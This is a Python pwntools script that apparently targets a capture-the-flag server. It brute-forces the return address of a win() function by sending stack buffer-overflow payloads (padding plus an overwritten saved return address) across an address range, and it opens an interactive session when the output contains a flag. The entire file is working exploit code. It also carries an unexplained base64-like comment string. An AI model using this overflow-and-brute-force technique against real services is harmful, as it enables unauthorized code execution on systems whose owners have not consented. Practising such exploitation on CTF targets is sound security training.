#!/usr/bin/env python3

from pwn import *
import time

HOST = "vm1.ctfeldjazair.dz"
PORT = 12399
SSL_ENABLED = True

BUFFER_SIZE = 64   
RBP_SIZE    = 8    


START_ADDR = 0x401000
END_ADDR   = 0x402000
STEP       = 0x10       

DELAY = 0.05

context.log_level = 'info'

# r+E8oxne9lwNKLBpCbjcYezlKjK2CiVfEsGvlSBHJ466gWcaCPTFOCOzitNpa/FK 

def connect():
    return remote(HOST, PORT, ssl=SSL_ENABLED)


def attempt(addr):
    try:
        r = connect()
        payload = flat(
            b'A' * BUFFER_SIZE,
            b'B' * RBP_SIZE,
            p64(addr)
        )
        log.info(f"[+] Trying address: {hex(addr)}")
        r.sendline(payload)

        resp = r.recv(timeout=1)
        if resp:
            output = resp.decode('utf-8', errors='ignore')
            print(f"[>] Output from {hex(addr)}:\n{output}\n")
            if "flag" in output.lower():
                log.success(f"[!] Flag found at {hex(addr)}!")
                r.interactive()
                return True
        else:
            log.debug(f"[-] No response at {hex(addr)}")
    except EOFError:
        log.debug(f"[-] EOF at {hex(addr)}")
    except Exception as e:
        log.error(f"[!] Exception at {hex(addr)}: {e}")
    finally:
        try:
            r.close()
        except:
            pass
    return False


def main():
    log.info(f"Brute-forcing win() from {hex(START_ADDR)} to {hex(END_ADDR)} step {hex(STEP)}")
    for addr in range(START_ADDR, END_ADDR, STEP):
        if attempt(addr):
            break
        time.sleep(DELAY)
    else:
        log.error("Brute-force complete: no valid win() address found containing 'flag'.")


if __name__ == '__main__':
    main()
